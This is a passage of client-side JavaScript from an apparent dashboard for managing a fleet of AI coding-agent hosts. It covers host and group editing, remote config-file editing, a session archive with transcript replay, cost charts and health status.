      await patchHost(h.id, { display_name: v || null });
    };
    $('hd-display').onkeydown = (e) => {
      if (e.key === 'Enter') { e.preventDefault(); $('hd-display').blur(); }
    };
    // tag input
    const inp = $('hd-tag-input');
    inp.value = '';
    inp.onkeydown = async (e) => {
      if (e.key !== 'Enter') return;
      const v = inp.value.trim();
      if (!v) return;
      const updated = Array.from(new Set([...(h.capabilities || []), v]));
      await patchHost(h.id, { capabilities: updated });
      inp.value = '';
    };
    // groups
    renderHostGroups(h);
    // live metrics + inventory tabs (guards same-host re-render churn)
    if (window.startHostMetrics) window.startHostMetrics(h.id);
  }

  // vt-0150: per-agent edit buttons. Read host.installed_backends (jsonb
  // map: name → version), cross-reference with state.backendConfigs (fetched
  // once from /api/fleet/backend-configs), render one button per editable
  // file. Dedupe AGENTS.md when both codex+opencode are installed.
  let _backendConfigsPromise = null;
  async function getBackendConfigs() {
    if (state.backendConfigs) return state.backendConfigs;
    if (!_backendConfigsPromise) {
      _backendConfigsPromise = api('GET', '/fleet/backend-configs')
        .then(m => { state.backendConfigs = m; return m; })
        .catch(() => ({ claude: [
          { name: 'CLAUDE.md',     label: 'CLAUDE.md' },
          { name: 'settings.json', label: 'settings.json' },
        ]}));
    }
    return _backendConfigsPromise;
  }
  async function renderHostEditButtons(h) {
    const container = $('hd-edit-buttons');
    if (!container) return;
    container.textContent = '';
    const installed = h.installed_backends || {};
    const installedKeys = Object.keys(installed).filter(k => installed[k]);
    const cfgMap = await getBackendConfigs();
    const seen = new Set();
    const entries = [];
    for (const backend of installedKeys) {
      const files = cfgMap[backend] || [];
      for (const f of files) {
        if (seen.has(f.name)) continue;
        seen.add(f.name);
        entries.push(f);
      }
    }
    // Legacy fallback ONLY for pre-vt-0150 daemons (no installed_backends
    // sent at all). Hosts that DO speak vt-0150 but have no claude
    // installed must not fall through to the claude pair — clicking the
    // legacy button would 403 on the daemon allowlist.
    if (!entries.length && !installedKeys.length) {
      const claude = cfgMap.claude || [];
      for (const f of claude) entries.push(f);
    }
    for (const f of entries) {
      const btn = document.createElement('button');
      btn.className = 'btn-ghost';
      btn.textContent = 'edit ' + (f.label || f.name);
      btn.onclick = () => openEditor(h.id, f.name);
      container.appendChild(btn);
      container.appendChild(document.createTextNode(' '));
    }
  }

  async function renderHostGroups(h) {
    // Lazy-load groups if we don't have them
    if (!state.groups.length) {
      try { state.groups = await api('GET', '/groups'); } catch {}
    }
    const memberGroups = state.groups.filter(g => (g.host_ids || []).includes(h.id));
    const nonMember = state.groups.filter(g => !(g.host_ids || []).includes(h.id));
    const el = $('hd-groups');
    el.innerHTML = memberGroups.length === 0
      ? `<span class="lbl" style="color:var(--text-faint)">not in any group</span>`
      : memberGroups.map(g => {
        const safeColor = safeCssColor(g.color);
        const accent = safeColor ? `style="border-color:${esc(safeColor)};color:${esc(safeColor)}"` : '';
        return `<span class="chip" ${accent}>${esc(g.name)}<button data-rm-group="${g.id}">×</button></span>`;
      }).join('');
    el.querySelectorAll('button[data-rm-group]').forEach(btn => {
      btn.onclick = async () => {
        await fetch(`/api/fleet/groups/${btn.dataset.rmGroup}/hosts/${h.id}`, {
          method: 'DELETE', headers: { authorization: 'Bearer ' + state.token },
        });
        state.groups = await api('GET', '/groups');
        renderHostGroups(h);
      };
    });
    // Inherited tags from groups (read-only display)
    const ihEl = $('hd-inherited');
    if (ihEl) {
      ihEl.innerHTML = '';
      const inherited = h.inherited_labels || {};
      let count = 0;
      for (const [groupName, labels] of Object.entries(inherited)) {
        for (const l of (labels || [])) {
          count++;
          const chip = document.createElement('span');
          chip.className = 'chip chip-inherited';
          const fromText = window.fleetI18n
            ? window.fleetI18n.t('host.inherited.from', { group: groupName })
            : `from: ${groupName}`;
          chip.innerHTML = `${esc(l)} <span class="chip-source">[${esc(fromText)}]</span>`;
          ihEl.appendChild(chip);
        }
      }
      if (!count) ihEl.innerHTML = `<span class="lbl" style="color:var(--text-faint)">none</span>`;
    }
  }

  async function patchHost(hostId, patch) {
    try {
      const r = await fetch('/api/fleet/hosts/' + hostId, {
        method: 'PATCH',
        headers: { 'authorization': 'Bearer ' + state.token, 'content-type': 'application/json' },
        body: JSON.stringify(patch),
      });
      if (!r.ok) throw new Error('HTTP ' + r.status);
      const updated = await r.json();
      // replace in state
      const idx = state.hosts.findIndex(x => x.id === hostId);
      if (idx >= 0) state.hosts[idx] = updated;
      render();
      if (state.viewMode === 'host' && state.selectedHost === hostId) renderHostDetail(updated);
    } catch (e) { alert('patch failed: ' + e.message); }
  }

  // ============ File editor ============
  async function openEditor(hostId, filePath) {
    const host = state.hosts.find(h => h.id === hostId);
    if (!host) return;
    if (host.status !== 'online') { alert(`host ${host.name} is offline`); return; }
    $('editor').hidden = false;
    $('editor-path').textContent = filePath;
    $('editor-host').textContent = host.name;
    $('editor-content').value = '';
    $('editor-content').disabled = true;
    $('editor-status').textContent = 'loading…';
    try {
      const r = await api('GET', `/hosts/${hostId}/file?path=${encodeURIComponent(filePath)}`);
      $('editor-content').value = r.content || '';
      $('editor-status').textContent = r.exists ? `loaded ${(r.content || '').length} bytes` : 'file does not exist (will create on save)';
    } catch (e) {
      $('editor-status').textContent = 'load failed: ' + e.message;
    } finally {
      $('editor-content').disabled = false;
      $('editor-content').focus();
    }
    $('editor-cancel').onclick = () => { $('editor').hidden = true; };
    $('editor-save').onclick = async () => {
      $('editor-save').disabled = true;
      $('editor-status').textContent = 'saving…';
      try {
        const r = await fetch('/api/fleet/hosts/' + hostId + '/file', {
          method: 'PUT',
          headers: { 'authorization': 'Bearer ' + state.token, 'content-type': 'application/json' },
          body: JSON.stringify({ path: filePath, content: $('editor-content').value }),
        });
        if (!r.ok) throw new Error('HTTP ' + r.status);
        const j = await r.json();
        $('editor-status').textContent = `saved ${j.bytes} bytes`;
        setTimeout(() => { $('editor').hidden = true; }, 600);
      } catch (e) {
        $('editor-status').textContent = 'save failed: ' + e.message;
      } finally {
        $('editor-save').disabled = false;
      }
    };
  }

  // ============ Routing (hash-based) ============
  // Routes: #/dashboard (default), #/archive, #/sessions/:id, #/cost
  function currentRoute() {
    const h = location.hash || '#/dashboard';
    const parts = h.replace(/^#\/?/, '').split('/');
    return { name: parts[0] || 'dashboard', arg: parts[1] || null };
  }
  function navigate(path) { if (location.hash !== '#' + path) location.hash = path; else applyRoute(); }

  // Route → page descriptor. Each entry: panels (ids to show), nav (highlighted button),
  // title (i18n key), open (handler). panels/title may be functions of `arg` for parametric routes.
  const PAGES = {
    dashboard:       { panels: [],                    nav: 'dashboard', title: 'page.dashboard',       open: () => {} },
    archive:         { panels: ['archive'],           nav: 'archive',   title: 'page.archive',         open: () => openArchive() },
    sessions:        { panels: ['sdetail'],           nav: 'archive',   title: 'page.session_detail',  open: arg => openSessionDetail(arg) },
    cost:            { panels: ['costview'],          nav: 'cost',      title: 'page.cost',            open: () => openCostView() },
    groups:          { panels: ['groupsview'],        nav: 'groups',    title: 'page.groups',          open: () => openGroupsView() },
    workflows:       { panels: arg => arg ? ['workfloweditor'] : ['workflowsview'],
                       nav: 'workflows',
                       title: arg => arg ? 'page.workflow_editor' : 'page.workflows',
                       open: arg => arg ? window.openWorkflowEditor?.(arg) : window.openWorkflowsList?.() },
    'workflow-runs': { panels: ['workflowrunviewer'], nav: 'workflows', title: 'page.workflow_run',    open: arg => window.openWorkflowRunViewer?.(arg) },
    prices:          { panels: ['pricesview'],        nav: 'prices',    title: 'page.prices',          open: () => window.openPricesView?.() },
    vault:           { panels: ['vaultview'],         nav: 'vault',     title: 'page.vault',           open: () => window.openVaultView?.() },
    health:          { panels: ['healthview'],        nav: 'health',    title: 'page.health',          open: () => openHealthView() },
  };
  const ALL_PANELS = ['archive','sdetail','costview','groupsview','workflowsview','workfloweditor','workflowrunviewer','pricesview','vaultview','healthview'];
  const ALL_NAVS = ['dashboard','archive','cost','groups','workflows','prices','vault','health'];

  function setPage(name, arg) {
    const p = PAGES[name] || PAGES.dashboard;
    ALL_PANELS.forEach(id => { const el = $(id); if (el) el.hidden = true; });
    const panels = typeof p.panels === 'function' ? p.panels(arg) : p.panels;
    panels.forEach(id => { const el = $(id); if (el) el.hidden = false; });
    ALL_NAVS.forEach(n => {
      const el = $('nav-' + n); if (el) el.classList.toggle('active-nav', n === p.nav);
    });
    const tk = typeof p.title === 'function' ? p.title(arg) : p.title;
    const titleEl = $('app-title');
    if (titleEl) {
      titleEl.dataset.i18n = tk;
      titleEl.textContent = window.fleetI18n ? window.fleetI18n.t(tk) : tk;
    }
    p.open(arg);
  }
  function applyRoute() {
    const r = currentRoute();
    setPage(r.name, r.arg);
  }
  window.addEventListener('hashchange', applyRoute);
  // Re-render dynamic content when language changes (inspector innerHTML etc.).
  window.addEventListener('fleet-langchange', () => applyRoute());

  // ============ Archive ============
  let archiveState = { offset: 0, limit: 50, filter: {}, total: 0 };
  async function openArchive() {
    // populate host filter once
    const sel = $('ar-host');
    sel.innerHTML = '<option value="">any</option>' +
      state.hosts.map(h => `<option value="${h.id}">${esc(h.display_name || h.name)}</option>`).join('');
    $('ar-apply').onclick = () => { archiveState.offset = 0; loadArchive(); };
    $('ar-reset').onclick = () => {
      ['ar-q','ar-since','ar-until'].forEach(id => $(id).value = '');
      ['ar-host','ar-status'].forEach(id => $(id).value = '');
      archiveState.offset = 0; loadArchive();
    };
    $('ar-prev').onclick = () => {
      archiveState.offset = Math.max(0, archiveState.offset - archiveState.limit);
      loadArchive();
    };
    $('ar-next').onclick = () => {
      if (archiveState.offset + archiveState.limit < archiveState.total) {
        archiveState.offset += archiveState.limit;
        loadArchive();
      }
    };
    $('archive-close').onclick = () => navigate('/dashboard');
    loadArchive();
  }
  async function loadArchive() {
    const params = new URLSearchParams({ with_count: '1', limit: archiveState.limit, offset: archiveState.offset });
    const filters = {
      q:        $('ar-q').value.trim(),
      host_id:  $('ar-host').value,
      status:   $('ar-status').value,
      since:    $('ar-since').value ? new Date($('ar-since').value).toISOString() : '',
      until:    $('ar-until').value ? new Date($('ar-until').value).toISOString() : '',
    };
    for (const [k, v] of Object.entries(filters)) if (v) params.set(k, v);
    archiveState.filter = filters;
    try {
      const r = await api('GET', '/sessions?' + params.toString());
      archiveState.total = r.total;
      renderArchive(r.rows);
      $('archive-count').textContent = `${r.total} sessions`;
      const end = Math.min(archiveState.offset + r.rows.length, r.total);
      $('ar-page').textContent = `${archiveState.offset + 1}–${end} of ${r.total}`;
      $('ar-prev').disabled = archiveState.offset === 0;
      $('ar-next').disabled = end >= r.total;
    } catch (e) { console.warn('archive load', e); }
  }
  function renderArchive(rows) {
    const body = $('ar-rows');
    body.innerHTML = rows.length === 0
      ? '<tr><td colspan="8" style="text-align:center; padding:2em; color:var(--text-faint)">no sessions match</td></tr>'
      : rows.map(s => {
          const host = state.hosts.find(h => h.id === s.host_id);
          const ts = new Date(s.started_at);
          const exitTag = s.exit_code != null ? ` exit=${s.exit_code}` : '';
          const labelText = (s.label || '') + (s.notes ? ` — ${s.notes.replace(/\n.*/, '')}` : '');
          return `<tr class="row-clickable" data-sid="${s.id}">
            <td class="nowrap">${ts.toLocaleString()}</td>
            <td class="sess-id-cell">${short(s.id)}</td>
            <td>${esc(host?.display_name || host?.name || '?')}</td>
            <td class="nowrap">${s.status}${exitTag}</td>
            <td class="cwd-cell" title="${esc(s.cwd || '')}">${esc(s.cwd || '—')}</td>
            <td class="label-cell" title="${esc(labelText)}">${esc(labelText || '—')}</td>
            <td class="nowrap" id="cost-${s.id.slice(0,8)}">—</td>
          </tr>`;
        }).join('');
    body.querySelectorAll('tr[data-sid]').forEach(tr => {
      tr.onclick = () => navigate('/sessions/' + tr.dataset.sid);
    });
    // Batch cost lookup: 1 POST instead of N concurrent GETs (was a perf hot
    // spot under load — see audit §6.1).
    if (rows.length) {
      api('POST', '/sessions/cost-batch', { ids: rows.map(s => s.id) })
        .then(map => {
          for (const s of rows) {
            const el = document.getElementById('cost-' + s.id.slice(0, 8));
            if (!el) continue;
            const c = map[s.id];
            if (!c) { el.textContent = '—'; continue; }
            const tag = c.attribution === 'approximate' ? '~' : '';
            el.textContent = c.usd ? `$${c.usd.toFixed(4)}${tag}` : '—';
          }
        }).catch(() => {});
    }
  }

  async function rerunSession(sid) {
    try {
      const s = await api('GET', `/sessions/${sid}`);
      if (!confirm(`Rerun session on ${state.hosts.find(h=>h.id===s.host_id)?.name}?\nargs: ${JSON.stringify(s.args)}`)) return;
      const r = await api('POST', '/sessions', {
        host_id: s.host_id, cwd: s.cwd, args: s.args, env: s.env || {},
        label: 'rerun: ' + (s.label || short(sid)),
        metadata: { rerun_of: sid },
      });
      navigate('/dashboard');
      setTimeout(() => attachSession(r.session_id), 200);
    } catch (e) { alert('rerun failed: ' + e.message); }
  }

  // ============ Session detail ============
  async function openSessionDetail(sid) {
    $('sd-id').textContent = short(sid);
    $('sd-host').textContent = '…'; $('sd-status').textContent = '…';
    $('sd-by').textContent = '—'; $('sd-started').textContent = '—'; $('sd-ended').textContent = '—';
    $('sd-exit').textContent = '—'; $('sd-cwd').textContent = '—'; $('sd-pid').textContent = '—';
    $('sd-args').textContent = '—'; $('sd-notes').value = ''; $('sd-cost').textContent = '—';
    $('sd-transcript').textContent = 'loading…';
    $('sd-timeline').innerHTML = '';
    $('sd-close').onclick = () => history.length > 1 ? history.back() : navigate('/archive');
    $('sd-attach').onclick = () => { navigate('/dashboard'); setTimeout(() => attachSession(sid), 200); };
    $('sd-rerun').onclick  = () => rerunSession(sid);
    $('sd-save-notes').onclick = async () => {
      try {
        await fetch('/api/fleet/sessions/' + sid, {
          method: 'PATCH',
          headers: { 'authorization': 'Bearer ' + state.token, 'content-type': 'application/json' },
          body: JSON.stringify({ notes: $('sd-notes').value }),
        });
        $('sd-save-notes').textContent = 'saved ✓';
        setTimeout(() => { $('sd-save-notes').textContent = 'save notes'; }, 1500);
      } catch (e) { alert('save failed: ' + e.message); }
    };
    document.querySelectorAll('.sd-tab').forEach(t => {
      t.onclick = () => {
        document.querySelectorAll('.sd-tab').forEach(x => x.classList.remove('active'));
        document.querySelectorAll('.sd-pane').forEach(x => x.classList.remove('active'));
        t.classList.add('active');
        document.getElementById('sd-tab-' + t.dataset.tab).classList.add('active');
      };
    });
    try {
      const s = await api('GET', '/sessions/' + sid);
      const host = state.hosts.find(h => h.id === s.host_id);
      $('sd-id').textContent = short(s.id);
      $('sd-host').textContent = host?.display_name || host?.name || short(s.host_id);
      $('sd-status').textContent = s.status;
      $('sd-by').textContent = s.created_by || '—';
      $('sd-started').textContent = new Date(s.started_at).toLocaleString();
      $('sd-ended').textContent = s.ended_at ? new Date(s.ended_at).toLocaleString() : '—';
      $('sd-exit').textContent = s.exit_code != null ? String(s.exit_code) : '—';
      $('sd-cwd').textContent = s.cwd || '—';
      $('sd-pid').textContent = s.pid != null ? s.pid : '—';
      $('sd-args').textContent = JSON.stringify(s.args || [], null, 2);
      $('sd-notes').value = s.notes || '';
    } catch (e) { $('sd-id').textContent = 'error'; $('sd-transcript').textContent = e.message; return; }
    // transcript — xterm replay (vt-0117) + plain fallback.
    try {
      // Init read-only xterm in #sd-transcript-term.
      const mount = $('sd-transcript-term');
      mount.innerHTML = '';
      if (state.sdTerm) { try { state.sdTerm.dispose(); } catch {} state.sdTerm = null; }
      const term = new Terminal({
        cursorBlink: false,
        disableStdin: true,
        fontFamily: '"JetBrains Mono", ui-monospace, monospace',
        fontSize: 12,
        lineHeight: 1.25,
        scrollback: 10000,
        allowProposedApi: true,
        theme: { background: '#0a0a0c', foreground: '#e8e6e1', cursor: 'transparent' },
      });
      const fit = new FitAddon.FitAddon();
      term.loadAddon(fit);
      term.open(mount);
      try { if (window.CanvasAddon && CanvasAddon.CanvasAddon) term.loadAddon(new CanvasAddon.CanvasAddon()); } catch {}
      try { if (window.Unicode11Addon && Unicode11Addon.Unicode11Addon) { term.loadAddon(new Unicode11Addon.Unicode11Addon()); term.unicode.activeVersion = '11'; } } catch {}
      requestAnimationFrame(() => { try { fit.fit(); } catch {} });
      state.sdTerm = term;
      // Fetch raw bytes and replay through term.write.
      const rb = await fetch('/api/fleet/sessions/' + sid + '/transcript.bin', {
        headers: { authorization: 'Bearer ' + state.token },
      });
      if (!rb.ok) throw new Error('HTTP ' + rb.status);
      const ab = await rb.arrayBuffer();
      term.write(new Uint8Array(ab));
      // Plain fallback (collapsed by default) for grep/copy use cases.
      const rt = await fetch('/api/fleet/sessions/' + sid + '/transcript.txt', {
        headers: { authorization: 'Bearer ' + state.token },
      });
      const t = await rt.text();
      $('sd-transcript').textContent = t || '(empty)';
    } catch (e) { $('sd-transcript').textContent = 'load failed: ' + e.message; }
    // timeline
    try {
      const tl = await api('GET', `/sessions/${sid}/timeline`);
      $('sd-timeline').innerHTML = tl.events.map(ev => `
        <li class="ev-${esc(ev.kind)}">
          <span class="ts">${new Date(ev.ts).toISOString()}</span>
          <span class="kind">${esc(ev.kind)}</span>
          <span class="detail">${ev.detail ? esc(JSON.stringify(ev.detail)) : ''}</span>
        </li>`).join('') || '<li class="lbl">no events</li>';
    } catch {}
    // cost
    try {
      const c = await api('GET', `/sessions/${sid}/cost`);
      const tag = c.attribution === 'approximate' ? ' ~' : '';
      $('sd-cost').innerHTML = `$${(c.usd || 0).toFixed(4)}${tag} · ${c.msgs} msgs` +
        (c.by_model ? '<br><small style="color:var(--text-dim)">' +
          Object.entries(c.by_model).map(([m, v]) => `${esc(m)}: $${v.usd.toFixed(4)} (in=${v.input_tokens}, out=${v.output_tokens})`).join('<br>') +
          '</small>' : '');
    } catch {}
  }

  // ============ Cost timeline view ============
  async function openCostView() {
    const days = parseInt($('cv-days').value, 10);
    const groupBy = $('cv-groupby').value;
    $('cv-days').onchange = openCostView;
    $('cv-groupby').onchange = openCostView;
    $('costview-close').onclick = () => navigate('/dashboard');
    let data;
    try { data = await api('GET', `/cost/timeline?days=${days}&group_by=${groupBy}`); }
    catch (e) { $('cv-summary').textContent = 'load failed: ' + e.message; return; }
    renderCostChart(data);
  }
  function renderCostChart(data) {
    const points = data.points || [];
    const groupBy = data.group_by || 'model';
    // For backward compat: if dim isn't present, fall back to model.
    const dimKey = (p) => p.dim != null ? p.dim : p.model;
    const dims = Array.from(new Set(points.map(dimKey)));
    const byDay = new Map();
    for (const p of points) {
      const d = new Date(p.day).toISOString().slice(0, 10);
      if (!byDay.has(d)) byDay.set(d, {});
      const k = dimKey(p);
      byDay.get(d)[k] = (byDay.get(d)[k] || 0) + p.usd;
    }
    const days = Array.from(byDay.keys()).sort();
    // summary
    const total = points.reduce((n, p) => n + p.usd, 0);
    const totalMsgs = points.reduce((n, p) => n + p.msgs, 0);
    const overlapNote = groupBy === 'group'
      ? `<div class="stat" style="color:var(--warn)"><span class="lbl">overlap</span><span class="val">hosts in multiple groups counted in each</span></div>`
      : '';
    $('cv-summary').innerHTML = `
      <div class="stat"><span class="lbl">${data.days}d total</span><span class="val val-warn">$${total.toFixed(2)}</span></div>
      <div class="stat"><span class="lbl">messages</span><span class="val">${totalMsgs}</span></div>
      <div class="stat"><span class="lbl">avg/day</span><span class="val">$${(total / Math.max(data.days, 1)).toFixed(2)}</span></div>
      <div class="stat"><span class="lbl">grouped by</span><span class="val">${groupBy} (${dims.length})</span></div>
      ${overlapNote}
    `;
    // chart
    const W = 1200, H = 320, PAD_L = 60, PAD_R = 30, PAD_T = 30, PAD_B = 50;
    const innerW = W - PAD_L - PAD_R, innerH = H - PAD_T - PAD_B;
    const max = Math.max(0.01, ...days.map(d => Object.values(byDay.get(d)).reduce((n, v) => n + v, 0)));
    const presetColors = { 'claude-opus-4-7': '#ff79c6', 'claude-sonnet-4-6': '#6fd5ff', 'claude-haiku-4-5': '#5cf08c' };
    const palette = ['#ff79c6','#6fd5ff','#5cf08c','#ffb547','#ff4d5e','#bbf3ff','#86ffac','#ffd07a','#ffaae0','#9be4ff'];
    const colorCache = new Map();
    function colorFor(k) {
      if (presetColors[k]) return presetColors[k];
      if (colorCache.has(k)) return colorCache.get(k);
      const c = palette[colorCache.size % palette.length];
      colorCache.set(k, c);
      return c;
    }
    const barW = innerW / Math.max(days.length, 1) * 0.7;
    const gap  = innerW / Math.max(days.length, 1);
    let svg = '';
    for (let i = 0; i <= 4; i++) {
      const y = PAD_T + innerH * (i / 4);
      const val = max * (1 - i / 4);
      svg += `<line x1="${PAD_L}" y1="${y}" x2="${W - PAD_R}" y2="${y}" stroke="#2a2832" stroke-dasharray="2,3"/>`;
      svg += `<text x="${PAD_L - 6}" y="${y + 4}" fill="#7a7575" font-family="JetBrains Mono" font-size="10" text-anchor="end">$${val.toFixed(2)}</text>`;
    }
    days.forEach((d, i) => {
      const x = PAD_L + i * gap + (gap - barW) / 2;
      let yCursor = PAD_T + innerH;
      for (const k of dims) {
        const v = byDay.get(d)[k] || 0;
        if (!v) continue;
        const h = innerH * (v / max);
        yCursor -= h;
        svg += `<rect x="${x}" y="${yCursor}" width="${barW}" height="${h}" fill="${colorFor(k)}" opacity="0.85" class="cv-bar" data-day="${d}" data-dim="${groupBy}" data-value="${esc(String(k))}" style="cursor:pointer"><title>${d} · ${k}: $${v.toFixed(4)} (click for sessions)</title></rect>`;
      }
      svg += `<text x="${x + barW/2}" y="${H - PAD_B + 18}" fill="#8a8580" font-family="JetBrains Mono" font-size="10" text-anchor="middle">${d.slice(5)}</text>`;
    });
    $('cv-chart').innerHTML = svg;
    $('cv-legend').innerHTML = dims.map(k =>
      `<span><span class="sw" style="background:${colorFor(k)}"></span>${esc(k)}</span>`).join('');
    // vt-0113: click any bar → modal with sessions in that day-bucket.
    $('cv-chart').querySelectorAll('rect.cv-bar').forEach(el => {
      el.onclick = () => openBucketDrillDown(el.dataset.day, el.dataset.dim, el.dataset.value);
    });
  }

  async function openBucketDrillDown(day, dim, value) {
    const modal = $('stack-modal');                 // reuse the generic modal frame
    if (!modal) return;
    modal.hidden = false;
    modal.innerHTML = `<div class="gd-frame" style="width:640px"><div class="gd-head">
      <span class="display" style="font-size:1.1em">SESSIONS · ${esc(day)}</span>
      <span class="lbl" style="margin-left:1em">${esc(dim)} = ${esc(value)}</span>
      <span style="flex:1"></span>
      <button class="btn-ghost" data-close>× close</button>
    </div><div class="gd-body" id="bucket-body">loading…</div></div>`;
    modal.querySelector('[data-close]').onclick = () => { modal.hidden = true; };
    try {
      const r = await api('GET', `/sessions/by-bucket?day=${encodeURIComponent(day)}&dim=${encodeURIComponent(dim)}&value=${encodeURIComponent(value)}`);
      // vt-0125: server now narrows for all dims; dim_unfiltered is always
      // false. Keep the note path as a fallback for legacy servers.
      const note = r.dim_unfiltered
        ? `<p style="color:var(--text-dim); font-size:11px">Showing all sessions on this day — per-${esc(dim)} filtering not supported by this server.</p>`
        : '';
      const rows = (r.sessions || []).map(s => {
        const host = s.host_display || s.host_name || (s.host_id || '').slice(0,8);
        const ts = new Date(s.started_at).toLocaleTimeString();
        const label = s.label || '—';
        return `<tr class="row-clickable" data-sid="${esc(s.id)}">
          <td class="nowrap">${esc(ts)}</td>
          <td>${esc(host)}</td>
          <td class="nowrap">${esc(s.status)}${s.exit_code != null ? ' (' + s.exit_code + ')' : ''}</td>
          <td class="label-cell" title="${esc(label)}">${esc(label)}</td>
        </tr>`;
      }).join('');
      $('bucket-body').innerHTML = `${note}<table class="archive-table">
        <thead><tr><th>started</th><th>host</th><th>status</th><th>label</th></tr></thead>
        <tbody>${rows || '<tr><td colspan="4" style="text-align:center; color:var(--text-faint)">no sessions in this bucket</td></tr>'}</tbody>
      </table>`;
      $('bucket-body').querySelectorAll('tr[data-sid]').forEach(tr => {
        tr.onclick = () => { modal.hidden = true; navigate('/sessions/' + tr.dataset.sid); };
      });
    } catch (e) {
      $('bucket-body').textContent = 'load failed: ' + e.message;
    }
  }

  // ============ Health dashboard (vt-0193) ============
  async function openHealthView() {
    const grid = $('health-grid');
    if (!grid) return;
    grid.innerHTML = '<div class="health-loading"><em>loading…</em></div>';
    let data;
    try {
      const r = await fetch('/api/healthz/detail', {
        headers: { authorization: 'Bearer ' + state.token },
      });
      data = await r.json();
    } catch (e) {
      grid.innerHTML = `<div class="health-card health-error"><em>fetch failed: ${esc(e.message)}</em></div>`;
      return;
    }
    grid.innerHTML = '';
    const labels = {
      pg: 'POSTGRES',
      secrets: 'SECRETS BACKEND',
      git: 'VAULT GIT',
      age_key_backup: 'AGE KEY BACKUP',
      daemons: 'FLEET DAEMONS',
    };
    for (const [key, sub] of Object.entries(data.subsystems || {})) {
      const card = document.createElement('div');
      card.className = `health-card health-${sub.status}`;
      const dot = sub.status === 'ok' ? '●' : sub.status === 'warn' ? '◐' : '✕';
      card.innerHTML = `
        <div class="health-card-head">
          <span class="health-dot">${dot}</span>
          <span class="health-name">${esc(labels[key] || key)}</span>
          <span class="health-status">${esc(sub.status)}</span>
        </div>
        <div class="health-detail">${esc(sub.detail || '')}</div>
      `;
      grid.appendChild(card);
    }
    const summary = document.createElement('div');
    summary.className = 'health-summary';
    summary.textContent = `${data.ok ? 'all systems nominal' : 'degraded'} · checked ${new Date(data.ts).toLocaleTimeString()}`;
    grid.appendChild(summary);
  }

  // ============ Groups page ============
  async function openGroupsView() {
    $('groupsview-close').onclick = () => navigate('/dashboard');
    $('grp-new').onclick = async () => {
      const name = prompt('group name?');
      if (!name) return;
      const description = prompt('description (optional)') || '';
      const color = prompt('color #hex (optional)') || '';
      try {
        await api('POST', '/groups', { name, description, color });
        await loadGroups();
      } catch (e) { alert('create failed: ' + e.message); }
    };
    await loadGroups();
  }
  async function loadGroups() {
    state.groups = await api('GET', '/groups');
    $('groups-count').textContent = `${state.groups.length} groups`;
    const body = $('grp-rows');
    body.innerHTML = state.groups.length === 0
      ? '<tr><td colspan="6" style="text-align:center; padding:2em; color:var(--text-faint)">no groups yet — create one</td></tr>'
      : state.groups.map(g => {
        const hostNames = (g.host_ids || []).map(id => {
          const h = state.hosts.find(x => x.id === id);
          return h ? (h.display_name || h.name) : id.slice(0,8);
        }).join(', ') || '(none)';
        const labelsChips = (g.labels || []).length
          ? (g.labels || []).map(l => `<span class="chip">${esc(l)}</span>`).join(' ')
          : '<span style="color:var(--text-faint)">—</span>';
        return `<tr class="row-clickable" data-grp-open="${g.id}">
          <td><strong>${esc(g.name)}</strong></td>
          <td>${esc(g.description || '—')}</td>
          <td>${labelsChips}</td>
          <td title="${esc(hostNames)}">${(g.host_ids || []).length}</td>
          <td>${(() => { const sc = safeCssColor(g.color); return sc ? `<span style="background:${esc(sc)};display:inline-block;width:16px;height:16px;border:1px solid var(--line);vertical-align:middle"></span> ${esc(sc)}` : (g.color ? '(invalid)' : '—'); })()}</td>
          <td><button class="btn-row" data-grp-del="${g.id}" title="delete">✕</button></td>
        </tr>`;
      }).join('');
    body.querySelectorAll('tr[data-grp-open]').forEach(tr => {
      tr.onclick = (ev) => {
        if (ev.target.closest('[data-grp-del]')) return;
        openGroupDetail(tr.dataset.grpOpen);
      };
    });
    body.querySelectorAll('button[data-grp-del]').forEach(btn => {
      btn.onclick = async (ev) => {
        ev.stopPropagation();
        if (!confirm('delete this group? hosts stay, just the group is removed.')) return;
        await fetch('/api/fleet/groups/' + btn.dataset.grpDel, { method: 'DELETE', headers: { authorization: 'Bearer ' + state.token } });
        await loadGroups();
      };
    });
  }

  // ============ Group detail modal ============
  async function openGroupDetail(groupId) {
    const g = await api('GET', '/groups/' + groupId);
    const modal = $('group-detail-modal');
    if (!modal) {
      console.error('group-detail-modal element missing'); return;
    }
    modal.hidden = false;
    modal.innerHTML = `
      <div class="gd-frame">
        <div class="gd-head">
          <span class="display" style="font-size:1.1em">GROUP //</span>
          <input id="gd-name" class="gd-name-input" value="${esc(g.name)}" maxlength="64">
          <input id="gd-color" type="color" value="${esc(g.color || '#888888')}" title="color">
          <span style="flex:1"></span>
          <button class="btn-ghost" data-gd-close>× close</button>
        </div>
        <div class="gd-body">
          <section>
            <label class="lbl">DESCRIPTION</label>
            <input id="gd-desc" value="${esc(g.description || '')}" style="width:100%; box-sizing:border-box; padding:.3em .5em; background:var(--bg); color:var(--text); border:1px solid var(--line); font-family:var(--font-mono);">
          </section>
          <section style="margin-top:1.4em">
            <label class="lbl">LABELS (inherited by all member hosts)</label>
            <div id="gd-labels-chip-row"></div>
            <form id="gd-add-label-form" style="margin-top:.4em">
              <input id="gd-new-label" type="text" placeholder="new label…" style="width:200px"/>
              <button type="submit" class="btn-ghost">+ add</button>
            </form>
          </section>
          <section style="margin-top:1.4em">
            <label class="lbl">HOSTS (${(g.hosts || []).length})</label>
            <div id="gd-hosts-rows"></div>
            <form id="gd-add-host-form" style="margin-top:.4em">
              <select id="gd-host-pick">${state.hosts.filter(h => !(g.hosts||[]).find(gh => gh.id === h.id)).map(h => `<option value="${h.id}">${esc(h.display_name || h.name)}</option>`).join('')}</select>
              <button type="submit" class="btn-ghost">+ add host</button>
            </form>
          </section>
          <section style="margin-top:1.4em">
            <label class="lbl">BRAIN PROMPT — prepended to every spawn dispatched to this group</label>
            <textarea id="gd-brain-prompt" rows="6" spellcheck="false"
              style="width:100%; box-sizing:border-box; padding:.4em .6em; background:var(--bg); color:var(--text); border:1px solid var(--line); font-family:var(--font-mono); font-size:12px; resize:vertical">${esc(g.brain_prompt || '')}</textarea>
            <div style="display:flex; gap:8px; align-items:center; margin-top:.4em">
              <button id="gd-save-brain" class="btn-primary" style="width:auto; padding:.3em 1em">save brain</button>
              <span id="gd-brain-status" class="lbl"></span>
            </div>
          </section>
        </div>
      </div>
    `;
    // Editable name/color/desc handlers
    $('gd-name').onblur = async () => {
      const v = $('gd-name').value.trim();
      if (!v || v === g.name) return;
      if (state.groups.some(other => other.name === v && other.id !== g.id)) {
        alert('name already exists');
        $('gd-name').value = g.name;
        return;
      }
      try {
